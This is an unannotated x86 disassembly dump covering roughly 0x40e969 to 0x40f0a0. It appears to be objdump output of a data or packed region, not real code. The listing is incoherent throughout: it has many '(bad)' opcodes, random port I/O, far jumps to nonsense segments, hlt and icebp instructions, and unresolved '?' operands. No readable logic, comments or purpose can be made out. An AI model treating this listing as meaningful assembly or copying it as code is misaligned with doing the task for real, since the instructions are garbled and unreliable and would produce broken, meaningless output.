  40e969:	cmp    DWORD PTR [ecx+0x5245ac7c],edx
  40e96f:	jo     0x40e9a5
  40e971:	xor    dh,0xa9
  40e974:	sub    al,0x87
  40e976:	xchg   esp,eax
  40e977:	in     eax,dx
  40e978:	sub    ebx,DWORD PTR [ebx]
  40e97a:	push   0x785d06bd
  40e97f:	pop    ss
  40e980:	test   al,0x56
  40e982:	sub    esi,edi
  40e984:	js     0x40e9cc
  40e986:	stc    
  40e987:	lods   al,BYTE PTR ds:[esi]
  40e988:	aaa    
  40e989:	ja     0x40e9c0
  40e98b:	lea    edx,[ecx+0x2c]
  40e98e:	cld    
  40e98f:	jnp    0x40e9f9
  40e991:	jae    0x40e951
  40e993:	pusha  
  40e994:	mov    esi,0xbbe2544f
  40e999:	sub    DWORD PTR [edi-0x67878c42],ebx
  40e99f:	pop    edx
  40e9a0:	push   edi
  40e9a1:	sar    DWORD PTR gs:[edx-0x16],1
  40e9a5:	fcmovbe st,st(7)
  40e9a7:	popa   
  40e9a8:	sub    BYTE PTR [edi+0x57],ch
  40e9ab:	lock add DWORD PTR [eax-0x6ec31eb3],0xffffff8c
  40e9b3:	out    dx,al
  40e9b4:	mov    esp,0x93ca6073
  40e9b9:	mov    ch,0x40
  40e9bb:	rcl    ch,cl
  40e9bd:	test   eax,0x6050262b
  40e9c2:	popf   
  40e9c3:	iret   
  40e9c4:	(bad)  [edi+0x4a]
  40e9c7:	ss dec edi
  40e9c9:	xchg   dl,ch
  40e9cb:	out    dx,al
  40e9cc:	inc    edx
  40e9cd:	arpl   dx,bx
  40e9cf:	mov    al,0x5a
  40e9d1:	lock fdiv QWORD PTR fs:[edx]
  40e9d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9d6:	adc    al,0x12
  40e9d8:	shl    DWORD PTR [eax-0x17],0x1a
  40e9dc:	ds or  eax,0xb1f97727
  40e9e2:	dec    edx
  40e9e3:	jns    0x40e99c
  40e9e5:	jb     0x40e9a2
  40e9e7:	jno    0x40e9c9
  40e9e9:	dec    eax
  40e9ea:	xchg   DWORD PTR [ebp-0x41b15f1e],edi
  40e9f0:	stos   BYTE PTR es:[edi],al
  40e9f1:	ss jecxz 0x40ea51
  40e9f4:	retf   
  40e9f5:	hlt    
  40e9f6:	or     BYTE PTR [ebx+0x6b],cl
  40e9f9:	jmp    0xaf3e:0x7d7b0d9d
  40ea00:	loop   0x40ea7b
  40ea02:	icebp  
  40ea03:	scas   eax,DWORD PTR es:[edi]
  40ea04:	(bad)  
  40ea06:	sbb    eax,0xbe8b0dc1
  40ea0b:	jmp    DWORD PTR [edx-0xef90072]
  40ea11:	hlt    
  40ea12:	icebp  
  40ea13:	xchg   esp,eax
  40ea14:	ret    0x65ed
  40ea17:	push   ecx
  40ea18:	and    dh,al
  40ea1a:	(bad)  
  40ea1b:	jns    0x40ea89
  40ea1d:	mov    ds:0x79029d70,al
  40ea22:	mov    bl,0x7c
  40ea24:	or     al,0xb4
  40ea26:	aaa    
  40ea27:	or     bh,bl
  40ea29:	fsubr  DWORD PTR [ecx]
  40ea2b:	or     eax,0xe2f63abe
  40ea30:	cmc    
  40ea31:	adc    BYTE PTR [ebx-0x32],bl
  40ea34:	xor    eax,0xa25d4c4b
  40ea3a:	or     eax,0xdafc9a4e
  40ea3f:	jmp    FWORD PTR [edi+esi*4]
  40ea42:	mov    ah,0x56
  40ea44:	adc    BYTE PTR ds:0xadc9c3ba,bl
  40ea4a:	je     0x40ea95
  40ea4c:	mov    eax,0x4f2baf69
  40ea51:	ins    BYTE PTR es:[edi],dx
  40ea52:	int3   
  40ea53:	adc    DWORD PTR [ebp-0x17],eax
  40ea56:	div    DWORD PTR [eax-0x2d]
  40ea59:	ins    DWORD PTR es:[edi],dx
  40ea5a:	popa   
  40ea5b:	stos   DWORD PTR es:[edi],eax
  40ea5c:	dec    esi
  40ea5d:	lods   al,BYTE PTR ds:[esi]
  40ea5e:	xor    BYTE PTR [edi-0x4ebbf76c],dh
  40ea64:	xor    bh,BYTE PTR [edx-0x27]
  40ea67:	pop    ss
  40ea68:	outs   dx,BYTE PTR ds:[esi]
  40ea69:	dec    BYTE PTR [esi+0x6a]
  40ea6c:	xchg   ecx,eax
  40ea6d:	mov    bh,0x6
  40ea6f:	sub    DWORD PTR [ecx+0x76],0x78341f14
  40ea76:	loope  0x40eaf0
  40ea78:	xchg   edi,esi
  40ea7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea7b:	pop    ebx
  40ea7c:	(bad)  
  40ea7d:	stos   DWORD PTR es:[edi],eax
  40ea7e:	jae    0x40eab0
  40ea80:	pop    edi
  40ea81:	stc    
  40ea82:	mov    eax,ds:0x23eac2e8
  40ea87:	adc    edi,edi
  40ea89:	sub    bh,bh
  40ea8b:	(bad)  
  40ea8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea8d:	pushf  
  40ea8e:	fs in  eax,dx
  40ea90:	adc    al,0x98
  40ea92:	leave  
  40ea93:	or     DWORD PTR [edi],edx
  40ea95:	lods   al,BYTE PTR ds:[esi]
  40ea96:	dec    ebx
  40ea97:	mov    esp,DWORD PTR [edi]
  40ea99:	adc    BYTE PTR [edi-0x4],0x22
  40ea9d:	shl    DWORD PTR [esp+eax*8+0x23b2bc51],0x76
  40eaa5:	int    0x2e
  40eaa7:	pop    ebp
  40eaa8:	cld    
  40eaa9:	popf   
  40eaaa:	and    eax,DWORD PTR [esi]
  40eaac:	cmp    BYTE PTR [eax],bh
  40eaae:	pop    esi
  40eaaf:	mov    ebx,0xcdf75ece
  40eab4:	sbb    ebp,DWORD PTR [esi]
  40eab6:	jecxz  0x40ead1
  40eab8:	dec    ebx
  40eab9:	jecxz  0x40ea42
  40eabb:	add    esp,DWORD PTR [edi]
  40eabd:	test   cl,cl
  40eabf:	pop    ss
  40eac0:	push   ds
  40eac1:	nop
  40eac2:	popa   
  40eac3:	das    
  40eac4:	push   ds
  40eac5:	mov    cl,0x60
  40eac7:	add    eax,DWORD PTR [edx]
  40eac9:	ins    DWORD PTR es:[edi],dx
  40eaca:	cmp    cl,dl
  40eacc:	jb     0x40ea5a
  40eace:	mov    dh,0xb8
  40ead0:	and    al,0x84
  40ead2:	sar    BYTE PTR [ebp-0x23],1
  40ead5:	jmp    0x40eb1b
  40ead7:	adc    al,0x84
  40ead9:	nop
  40eada:	fcomp  st(7)
  40eadc:	xor    eax,0x784ee8f8
  40eae1:	mov    ebx,0xa594f167
  40eae6:	adc    DWORD PTR [edx-0x17],esi
  40eae9:	int3   
  40eaea:	xchg   edx,eax
  40eaeb:	jo     0x40eadb
  40eaed:	shl    BYTE PTR [ebx-0x34],1
  40eaf0:	mov    ebp,0xa1e87b7a
  40eaf5:	scas   eax,DWORD PTR es:[edi]
  40eaf6:	call   0x7f79:0xb022762b
  40eafd:	test   eax,0x56a2c1ad
  40eb02:	mov    esi,0xe7372880
  40eb07:	xchg   ebp,eax
  40eb08:	dec    edi
  40eb09:	add    DWORD PTR [edx+0x57],ecx
  40eb0c:	pop    eax
  40eb0d:	mov    dh,0x59
  40eb0f:	xchg   esi,eax
  40eb10:	pop    ss
  40eb11:	jg     0x40eb72
  40eb13:	dec    edx
  40eb14:	dec    esi
  40eb15:	jmp    0x1d4c:0x647fd80
  40eb1c:	fmul   DWORD PTR [esi-0x71]
  40eb1f:	shl    DWORD PTR [ecx],0x25
  40eb22:	xor    ebp,ebx
  40eb24:	bound  edi,QWORD PTR [ebp+0x23]
  40eb27:	popa   
  40eb28:	xor    ah,BYTE PTR [esi]
  40eb2a:	xor    ch,BYTE PTR [edi]
  40eb2c:	(bad)  
  40eb2e:	jo     0x40eb82
  40eb30:	dec    esp
  40eb31:	or     ebp,edx
  40eb33:	(bad)  
  40eb35:	fsub   st,st(1)
  40eb37:	mov    eax,0xc5bcc3ef
  40eb3c:	into   
  40eb3d:	sub    DWORD PTR [edi-0x1ff0be9a],ebx
  40eb43:	outs   dx,BYTE PTR ds:[esi]
  40eb44:	mov    edi,0x9a15802
  40eb49:	dec    ebx
  40eb4a:	jbe    0x40eae4
  40eb4c:	pop    esi
  40eb4d:	(bad)  
  40eb4e:	aad    0x45
  40eb50:	lock sub DWORD PTR [ecx],edx
  40eb53:	ins    DWORD PTR es:[edi],dx
  40eb54:	ja     0x40eaff
  40eb56:	fadd   QWORD PTR [edx+eax*8-0x4f]
  40eb5a:	repz xchg esp,eax
  40eb5c:	in     eax,0xd5
  40eb5e:	and    al,0xc8
  40eb60:	fs jbe 0x40eb17
  40eb63:	(bad)  
  40eb64:	call   0x27b114ae
  40eb69:	xchg   BYTE PTR [edx-0x66],ah
  40eb6c:	sahf   
  40eb6d:	cmp    BYTE PTR [edx+0x4b26d803],0xb5
  40eb74:	pop    ebx
  40eb75:	or     eax,0x5f5c5821
  40eb7a:	mov    esp,0xfff843a4
  40eb7f:	pop    ecx
  40eb80:	xchg   ebx,eax
  40eb81:	sub    al,0xdc
  40eb83:	add    ebp,DWORD PTR [eax+0x679fa3d2]
  40eb89:	pop    esi
  40eb8a:	(bad)  
  40eb8b:	jne    0x40eb2a
  40eb8d:	mov    edi,DWORD PTR [esi+eax*2-0x73492a67]
  40eb94:	loope  0x40ec09
  40eb96:	dec    ebp
  40eb97:	icebp  
  40eb98:	mov    ds:0x7ba7f8e7,eax
  40eb9d:	and    BYTE PTR [eax-0x3],ah
  40eba0:	jb     0x40eb40
  40eba2:	cmp    esi,0x54795317
  40eba8:	pop    esp
  40eba9:	mov    dl,0x7e
  40ebab:	jmp    0x40ebf2
  40ebad:	inc    ebx
  40ebae:	xor    DWORD PTR [edi-0x55],esp
  40ebb1:	add    eax,eax
  40ebb3:	jb     0x40ebf8
  40ebb5:	add    edi,DWORD PTR [esi]
  40ebb7:	mov    ds:0xe4b9c1c,al
  40ebbc:	lock push esi
  40ebbe:	jno    0x40ebed
  40ebc0:	fsub   st(6),st
  40ebc2:	cli    
  40ebc3:	pop    ebp
  40ebc4:	cli    
  40ebc5:	mov    al,ds:0x9840ba5
  40ebca:	and    cl,BYTE PTR [esp+ebp*4]
  40ebcd:	daa    
  40ebce:	lds    esi,FWORD PTR [esi+0x19]
  40ebd1:	stos   BYTE PTR es:[edi],al
  40ebd2:	adc    ch,BYTE PTR [edi-0x13ce40e6]
  40ebd8:	les    esi,FWORD PTR gs:[ebp-0x22]
  40ebdc:	sbb    dh,BYTE PTR [esi-0x6dcabcdc]
  40ebe2:	cs cmp esi,ecx
  40ebe5:	and    BYTE PTR [esi-0xf2a9692],0xed
  40ebec:	dec    edi
  40ebed:	sbb    BYTE PTR [ecx-0x7e4eb64c],bl
  40ebf3:	inc    eax
  40ebf4:	ficom  WORD PTR [edx+edx*8+0x41]
  40ebf8:	inc    esi
  40ebf9:	xchg   esi,eax
  40ebfa:	xchg   edi,eax
  40ebfb:	xchg   ecx,eax
  40ebfc:	mov    edx,0x775ed80f
  40ec01:	sub    DWORD PTR [ebp-0x63ebdbe],eax
  40ec07:	nop
  40ec08:	inc    eax
  40ec09:	sahf   
  40ec0a:	(bad)  [ecx]
  40ec0c:	pusha  
  40ec0d:	xor    ah,BYTE PTR [eax+0x1efbc541]
  40ec13:	out    dx,al
  40ec14:	pop    esp
  40ec15:	pop    es
  40ec16:	inc    ebx
  40ec17:	pop    ebp
  40ec18:	popf   
  40ec19:	jmp    0x8a9b:0x592cd401
  40ec20:	sbb    DWORD PTR [ebx-0x44],edx
  40ec23:	jp     0x40ec0c
  40ec25:	cmp    dl,BYTE PTR [edx]
  40ec27:	das    
  40ec28:	inc    ebx
  40ec29:	sbb    BYTE PTR [ebx-0x7e60ea1],0x76
  40ec30:	cdq    
  40ec31:	push   ds
  40ec32:	loopne 0x40ec44
  40ec34:	pop    ebp
  40ec35:	pop    eax
  40ec36:	in     al,dx
  40ec37:	dec    esi
  40ec38:	jns    0x40ec51
  40ec3a:	out    dx,eax
  40ec3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec3c:	pusha  
  40ec3d:	and    WORD PTR [esi],di
  40ec40:	call   DWORD PTR [ecx+edx*4-0x14e0b576]
  40ec47:	mov    esi,0xc8641f26
  40ec4c:	fcmovbe st,st(0)
  40ec4e:	add    ebx,DWORD PTR [edx+ebp*8+0x2c7d243c]
  40ec55:	cmp    bh,al
  40ec57:	xor    al,0xa4
  40ec59:	ffree  st(2)
  40ec5b:	repnz push edx
  40ec5d:	xchg   ebx,eax
  40ec5e:	cmp    DWORD PTR [ecx+0x7c],edi
  40ec61:	lock into 
  40ec63:	ss (bad) 
  40ec66:	(bad)  
  40ec67:	adc    al,0x28
  40ec69:	aaa    
  40ec6a:	(bad)  
  40ec6b:	or     DWORD PTR [edx-0x52],edi
  40ec6e:	ins    BYTE PTR es:[edi],dx
  40ec6f:	adc    al,0x4
  40ec71:	xchg   esp,eax
  40ec72:	es push edi
  40ec74:	lods   eax,DWORD PTR ds:[esi]
  40ec75:	jg     0x40ecdb
  40ec77:	out    dx,eax
  40ec78:	sub    BYTE PTR [ecx+0x42438aae],dh
  40ec7e:	push   0x1f469aae
  40ec83:	inc    edi
  40ec84:	mov    edx,0xbbed75be
  40ec89:	fdiv   DWORD PTR [esp+ebp*1]
  40ec8c:	ds pushf 
  40ec8e:	jnp    0x40ec82
  40ec90:	sbb    esi,ebp
  40ec92:	retf   0x67c2
  40ec95:	push   eax
  40ec96:	push   esi
  40ec97:	sub    edi,edx
  40ec99:	sbb    ah,BYTE PTR [edx]
  40ec9b:	popa   
  40ec9c:	mov    ds:0xa1085683,al
  40eca1:	ffreep st(0)
  40eca3:	mov    eax,0xc04f8a10
  40eca8:	shl    BYTE PTR [edi-0x73b65fbd],1
  40ecae:	test   eax,0x2cc066ff
  40ecb3:	sub    al,cl
  40ecb5:	iret   
  40ecb6:	lds    esp,FWORD PTR [ebp-0x7d]
  40ecb9:	xchg   esp,eax
  40ecba:	cdq    
  40ecbb:	push   ss
  40ecbc:	popa   
  40ecbd:	popa   
  40ecbe:	push   ss
  40ecbf:	ret    0xd6e
  40ecc2:	and    ch,0x1a
  40ecc5:	mov    ebx,DWORD PTR [ebx+ebp*4+0x43]
  40ecc9:	arpl   sp,ax
  40eccb:	mov    esi,0xc4416c48
  40ecd0:	(bad)  [eax]
  40ecd2:	and    eax,0x9d13f8a2
  40ecd7:	xchg   DWORD PTR [edx-0x1830565],eax
  40ecdd:	loope  0x40ed12
  40ecdf:	mov    ebp,DWORD PTR [ebp-0xf]
  40ece2:	fdiv   DWORD PTR [ebx]
  40ece4:	pop    ebp
  40ece5:	jae    0x40ece3
  40ece7:	fdiv   DWORD PTR [edx-0x65]
  40ecea:	arpl   dx,si
  40ecec:	addr16 push 0x10
  40ecef:	ins    BYTE PTR es:[edi],dx
  40ecf0:	sub    eax,0xe1357a14
  40ecf5:	jbe    0x40ecb1
  40ecf7:	mov    bh,0x5
  40ecf9:	push   edx
  40ecfa:	fidivr DWORD PTR [ebp-0x40]
  40ecfd:	repnz stos BYTE PTR es:[edi],al
  40ecff:	hlt    
  40ed00:	or     DWORD PTR [edi+0x2f],ebp
  40ed03:	add    DWORD PTR es:[ecx-0x4e52e94d],0x5a0ee55
  40ed0e:	push   esi
  40ed0f:	jne    0x40ecbc
  40ed11:	xor    ecx,esp
  40ed13:	(bad)  
  40ed14:	test   ax,bx
  40ed17:	scas   al,BYTE PTR es:[edi]
  40ed18:	adc    esi,DWORD PTR [esi+ebx*1]
  40ed1b:	xchg   edi,eax
  40ed1c:	imul   ecx,DWORD PTR [ecx+ecx*1-0x386a5366],0xfffffff0
  40ed24:	jo     0x40ecc9
  40ed26:	stos   DWORD PTR es:[edi],eax
  40ed27:	or     DWORD PTR [ecx],eax
  40ed29:	scas   al,BYTE PTR es:[edi]
  40ed2a:	inc    BYTE PTR [ebp+0x566e4ee8]
  40ed30:	jecxz  0x40ecde
  40ed32:	jno    0x40ed5d
  40ed34:	das    
  40ed35:	jo     0x40ed05
  40ed37:	adc    DWORD PTR [edx],0xfffffff2
  40ed3a:	je     0x40ed4e
  40ed3c:	ret    0x5886
  40ed3f:	iret   
  40ed40:	clc    
  40ed41:	jl     0x40ed09
  40ed43:	into   
  40ed44:	mov    bh,0x46
  40ed46:	add    eax,0xb1649832
  40ed4b:	stos   DWORD PTR es:[edi],eax
  40ed4c:	fidivr DWORD PTR [ebp-0x46]
  40ed4f:	jl     0x40ed80
  40ed51:	popa   
  40ed52:	(bad)  
  40ed53:	aam    0x7f
  40ed55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed56:	cmp    BYTE PTR [edi],ah
  40ed58:	mov    ch,0x3e
  40ed5a:	sub    eax,0x6a99671b
  40ed5f:	daa    
  40ed60:	pusha  
  40ed61:	xchg   ecx,eax
  40ed62:	rcl    DWORD PTR [edx+0x30171b54],cl
  40ed68:	rcl    ecx,1
  40ed6a:	out    dx,eax
  40ed6b:	fidiv  DWORD PTR [ecx+ebp*8-0x41f59db9]
  40ed72:	add    DWORD PTR [eax+0x54cb75f6],edx
  40ed78:	int    0x1c
  40ed7a:	mov    dl,cl
  40ed7c:	outs   dx,DWORD PTR ds:[esi]
  40ed7d:	in     eax,dx
  40ed7e:	xor    ebx,0xffffffc6
  40ed81:	test   al,0x2b
  40ed83:	mov    cl,0xf1
  40ed85:	xchg   edx,eax
  40ed86:	xor    eax,0x3c41b0b6
  40ed8b:	(bad)  
  40ed8c:	adc    edi,esp
  40ed8e:	ret    
  40ed8f:	fsubr  DWORD PTR [ecx-0x47]
  40ed92:	js     0x40ed8f
  40ed94:	dec    esp
  40ed95:	loopne 0x40ee0e
  40ed97:	adc    dh,BYTE PTR [edi+0x28f37650]
  40ed9d:	adc    DWORD PTR [edx],ecx
  40ed9f:	mov    dh,0x2f
  40eda1:	xor    ch,BYTE PTR [eax-0x4e853f3b]
  40eda7:	imul   edi
  40eda9:	push   edi
  40edaa:	pop    ebx
  40edab:	mov    DWORD PTR [esi+eiz*8+0x42],edx
  40edaf:	outs   dx,BYTE PTR ds:[esi]
  40edb0:	jg     0x40eda3
  40edb2:	in     eax,0xc5
  40edb4:	xor    esp,DWORD PTR [ecx-0x24a37cd6]
  40edba:	xchg   ecx,eax
  40edbb:	repnz imul BYTE PTR [ebx+eiz*8]
  40edbf:	pop    esi
  40edc0:	aad    0xb
  40edc2:	ret    
  40edc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edc4:	add    esi,eax
  40edc6:	jg     0x40ee0e
  40edc8:	rcl    BYTE PTR [ebp+ebp*4-0x4d],cl
  40edcc:	sbb    DWORD PTR [ecx+0x4a],edx
  40edcf:	arpl   WORD PTR [esi+0x44ec10d1],sp
  40edd5:	pop    ebx
  40edd6:	adc    DWORD PTR [ebx+0x3],0x24
  40edda:	and    ebp,DWORD PTR [eax]
  40eddc:	out    0x32,al
  40edde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eddf:	add    BYTE PTR [edi-0x8],dl
  40ede2:	in     eax,0x33
  40ede4:	out    0x89,eax
  40ede6:	call   0x347451ab
  40edeb:	stc    
  40edec:	mov    bh,0x7c
  40edee:	je     0x40ed87
  40edf0:	xchg   edi,eax
  40edf1:	addr16 inc edi
  40edf3:	fbld   TBYTE PTR ds:0xdf4fc875
  40edf9:	hlt    
  40edfa:	sub    bh,BYTE PTR [ecx]
  40edfc:	jns    0x40ed7e
  40edfe:	sbb    ah,BYTE PTR [ecx+0x6247e2ce]
  40ee04:	shl    BYTE PTR [ebx+0x31fb9e3f],1
  40ee0a:	cmp    dl,ch
  40ee0c:	ret    
  40ee0d:	sbb    ebx,ebx
  40ee0f:	xchg   ebp,eax
  40ee10:	cmp    ecx,DWORD PTR [ebp-0x4b]
  40ee13:	push   ebp
  40ee14:	daa    
  40ee15:	inc    ebp
  40ee16:	mov    al,ds:0xd32a172b
  40ee1b:	add    eax,0xc592b177
  40ee20:	and    eax,0x3ae15392
  40ee25:	mov    edi,0xe172858e
  40ee2a:	dec    edi
  40ee2b:	(bad)  
  40ee2c:	stc    
  40ee2d:	add    al,0xa5
  40ee2f:	jb     0x40ee16
  40ee31:	ror    BYTE PTR [edi-0x78],cl
  40ee34:	lds    ebx,FWORD PTR [esi-0x2dd4f9f1]
  40ee3a:	or     ecx,DWORD PTR [esi+0x17]
  40ee3d:	mov    eax,ds:0xa1fe2eeb
  40ee42:	cdq    
  40ee43:	ins    DWORD PTR es:[edi],dx
  40ee44:	inc    edi
  40ee45:	mov    ?,edx
  40ee47:	jb     0x40ee13
  40ee49:	pop    es
  40ee4a:	int3   
  40ee4b:	add    BYTE PTR [ebp+0x7f],ch
  40ee4e:	popf   
  40ee4f:	sahf   
  40ee50:	shr    BYTE PTR [esi-0x2a437e5c],1
  40ee56:	add    ebx,DWORD PTR [esi]
  40ee58:	pop    eax
  40ee59:	xchg   ebp,eax
  40ee5a:	into   
  40ee5b:	pop    esi
  40ee5c:	dec    edi
  40ee5d:	mov    esi,0x5c3cce62
  40ee62:	in     eax,0x2b
  40ee64:	fiadd  DWORD PTR [edx]
  40ee66:	repz cmc 
  40ee68:	xchg   ebx,eax
  40ee69:	push   esp
  40ee6a:	jle    0x40ee5e
  40ee6c:	into   
  40ee6d:	adc    edi,edx
  40ee6f:	push   eax
  40ee70:	int    0xfd
  40ee72:	inc    ebp
  40ee73:	xchg   esi,eax
  40ee74:	mov    edi,?
  40ee76:	inc    esi
  40ee77:	cmp    al,0x8c
  40ee79:	shl    DWORD PTR [ebp-0x904d641],cl
  40ee7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee80:	ret    0x88c0
  40ee83:	pop    ebx
  40ee84:	mov    ?,WORD PTR [esi+0x2d]
  40ee87:	push   ebx
  40ee88:	xor    edi,DWORD PTR [edi]
  40ee8a:	jecxz  0x40ee89
  40ee8c:	out    0x48,eax
  40ee8e:	push   ss
  40ee8f:	mov    bh,0xf8
  40ee91:	cmp    ah,dl
  40ee93:	add    BYTE PTR ds:0xd2b6df62,bh
  40ee99:	icebp  
  40ee9a:	cmp    al,0x45
  40ee9c:	in     eax,dx
  40ee9d:	inc    bp
  40ee9f:	outs   dx,BYTE PTR ds:[esi]
  40eea0:	rcr    BYTE PTR [ebp+0x5],cl
  40eea3:	push   esi
  40eea4:	push   0x69926c13
  40eea9:	jns    0x40eea0
  40eeab:	mov    BYTE PTR [ebx+0x43ff5aed],dh
  40eeb1:	iret   
  40eeb2:	xchg   edi,eax
  40eeb3:	and    esp,DWORD PTR [ebx]
  40eeb5:	ror    DWORD PTR [esi],0x41
  40eeb8:	xor    eax,0x95e6499c
  40eebd:	push   esi
  40eebe:	jno    0x40eeb7
  40eec0:	jne    0x40ee48
  40eec2:	pusha  
  40eec3:	push   esi
  40eec4:	jbe    0x40ee6d
  40eec6:	dec    ebp
  40eec7:	sar    DWORD PTR [ecx+0x5a66dd9b],0xdb
  40eece:	inc    edx
  40eecf:	mov    ecx,0xe5ae498d
  40eed4:	cld    
  40eed5:	or     eax,0x8216e4a3
  40eeda:	sub    dl,dh
  40eedc:	sub    dl,BYTE PTR fs:[esi+ebp*1+0x196f7620]
  40eee4:	fsub   st(3),st
  40eee6:	js     0x40ef37
  40eee8:	sbb    al,0x1b
  40eeea:	test   DWORD PTR [esi+0x56],edx
  40eeed:	mov    eax,ds:0x90fe298
  40eef2:	iret   
  40eef3:	rcr    DWORD PTR [edx+eiz*4-0x5],1
  40eef7:	hlt    
  40eef8:	mov    edx,0x6c52e972
  40eefd:	(bad)
  40ef01:	sbb    DWORD PTR [esi+0x52],ecx
  40ef04:	mov    edx,0x1a32d35a
  40ef09:	rol    ebx,0xf5
  40ef0c:	int3   
  40ef0d:	inc    esi
  40ef0e:	sbb    eax,0x5e503818
  40ef13:	xchg   ecx,eax
  40ef14:	add    esi,DWORD PTR [ebx]
  40ef16:	daa    
  40ef17:	and    eax,DWORD PTR [ecx]
  40ef19:	jp     0x40eefe
  40ef1b:	xor    eax,0x8efd196c
  40ef20:	repz lahf 
  40ef22:	push   ecx
  40ef23:	or     edx,ebp
  40ef25:	outs   dx,DWORD PTR ds:[esi]
  40ef26:	out    dx,al
  40ef27:	push   ebp
  40ef28:	mov    eax,0x604aeb79
  40ef2d:	dec    edx
  40ef2e:	push   esp
  40ef2f:	mov    esp,0x26c805e0
  40ef34:	out    0xda,al
  40ef36:	outs   dx,BYTE PTR ds:[esi]
  40ef37:	adc    eax,0x77b1516a
  40ef3c:	(bad)  
  40ef3d:	lods   eax,DWORD PTR ds:[esi]
  40ef3f:	mov    bh,0x4e
  40ef41:	pop    eax
  40ef42:	or     DWORD PTR [edi],ebx
  40ef44:	std    
  40ef45:	repz mov esi,0x2b972d6d
  40ef4b:	call   0x5a1e6f67
  40ef50:	lods   eax,DWORD PTR ds:[esi]
  40ef51:	sub    BYTE PTR [edi-0x5d],0x81
  40ef55:	mov    eax,0xfb7a57e9
  40ef5a:	inc    eax
  40ef5b:	xchg   ecx,edx
  40ef5d:	sbb    eax,0xac4a9fbf
  40ef62:	dec    ebx
  40ef63:	aam    0xc3
  40ef65:	fstp   QWORD PTR [ebp+ebx*2+0x6a]
  40ef69:	dec    ebp
  40ef6a:	mov    ds:0x59b69e00,eax
  40ef6f:	loop   0x40ef13
  40ef71:	mov    bl,0xcf
  40ef73:	jle    0x40ef68
  40ef75:	out    0xb,eax
  40ef77:	sub    esp,DWORD PTR [ecx-0x43]
  40ef7a:	shr    BYTE PTR [ebx],cl
  40ef7c:	mov    edi,DWORD PTR [esp+esi*2+0x28]
  40ef80:	mov    eax,ds:0x9938a06f
  40ef85:	push   ebp
  40ef86:	rol    esp,0x7
  40ef89:	or     edx,esp
  40ef8b:	lock sbb BYTE PTR [eax-0x6],al
  40ef8f:	(bad)  
  40ef90:	out    dx,al
  40ef91:	pop    edx
  40ef92:	push   ebx
  40ef93:	out    dx,al
  40ef94:	repz pusha 
  40ef96:	pop    ss
  40ef97:	mov    esi,0x692377f8
  40ef9c:	jmp    0xd1a34727
  40efa1:	mov    WORD PTR [ebp-0x78a461b],ds
  40efa7:	jecxz  0x40efea
  40efa9:	ret    0xb7a6
  40efac:	repnz scas eax,DWORD PTR es:[edi]
  40efae:	es pushf 
  40efb0:	call   0xaee4f86e
  40efb5:	cmc    
  40efb6:	repnz and eax,0x132ebae8
  40efbc:	pop    esi
  40efbd:	ret    0x806
  40efc0:	into   
  40efc1:	jecxz  0x40efa9
  40efc3:	(bad)  
  40efc4:	ret    
  40efc5:	mov    esp,ebp
  40efc7:	aad    0x4
  40efc9:	and    al,0xdd
  40efcb:	xor    DWORD PTR [ecx-0x3af613f1],ebp
  40efd1:	jo     0x40f02f
  40efd3:	je     0x40f01b
  40efd5:	xor    BYTE PTR [ecx],dh
  40efd7:	neg    bh
  40efd9:	push   ebx
  40efda:	loop   0x40ef63
  40efdc:	mov    cl,0x95
  40efde:	jne    0x40efec
  40efe0:	daa    
  40efe1:	sub    eax,0xdd46da1f
  40efe6:	xchg   edx,eax
  40efe7:	xchg   dl,ch
  40efe9:	icebp  
  40efea:	jmpw   0x1938
  40efee:	in     eax,dx
  40efef:	mov    esp,0xd8d2bfbd
  40eff4:	add    al,0xf
  40eff6:	ds jae 0x40f02b
  40eff9:	arpl   WORD PTR [edi+0x7603fc1b],si
  40efff:	fsubr  QWORD PTR [ebx+0xb4704c5]
  40f005:	inc    edi
  40f006:	(bad)  
  40f007:	push   0x1b
  40f009:	pusha  
  40f00a:	dec    ebx
  40f00b:	dec    eax
  40f00c:	push   edx
  40f00d:	stc    
  40f00e:	push   ss
  40f00f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f010:	fwait
  40f011:	mov    dh,0xae
  40f013:	xchg   edx,eax
  40f014:	mov    al,0x4d
  40f016:	test   BYTE PTR [ecx-0x3f8437d3],bh
  40f01c:	les    ebx,FWORD PTR [ecx+0x4f]
  40f01f:	shl    DWORD PTR [edi+edi*4-0x614f4825],cl
  40f026:	sbb    BYTE PTR [ecx],bl
  40f028:	mov    bl,ah
  40f02a:	mov    cl,0xa4
  40f02c:	sub    edi,eax
  40f02e:	cs out dx,eax
  40f030:	enter  0x8941,0x4b
  40f034:	mov    dh,ch
  40f036:	pop    edx
  40f037:	xor    bl,BYTE PTR [ebx+eiz*1+0xf5ead86]
  40f03e:	push   esp
  40f03f:	lds    ecx,FWORD PTR [ecx+0x58]
  40f042:	repz imul edx,ebp,0xe0dde479
  40f049:	les    ebx,FWORD PTR [ebx]
  40f04b:	sub    BYTE PTR [ecx],bl
  40f04d:	imul   esi,DWORD PTR [ebx+0x5f4574bc],0x5997029a
  40f057:	test   al,0x59
  40f059:	xchg   ebp,eax
  40f05a:	hlt    
  40f05b:	repz pop edi
  40f05d:	inc    esp
  40f05e:	rol    DWORD PTR [eax-0x4c67b1ec],cl
  40f064:	mov    bl,BYTE PTR [ebx]
  40f066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f067:	mov    ch,0xe1
  40f069:	mov    al,0x21
  40f06b:	mov    al,ds:0xda7591e3
  40f070:	mov    ecx,0xad6535fc
  40f075:	jecxz  0x40f04f
  40f077:	aaa    
  40f078:	fisubr WORD PTR [ecx]
  40f07a:	and    eax,0x574a6695
  40f07f:	pop    eax
  40f080:	jge    0x40f078
  40f082:	xor    al,0x63
  40f084:	or     al,0x24
  40f086:	sar    DWORD PTR ds:0xf6fc107e,cl
  40f08c:	push   es
  40f08d:	int3   
  40f08e:	pop    ecx
  40f08f:	icebp  
  40f090:	jl     0x40f0bf
  40f092:	jmp    0xfa22:0x9f92beed
  40f099:	mov    ebx,0x350f350b
  40f09e:	adc    dl,bh
  40f0a0:	out    0x9e,eax
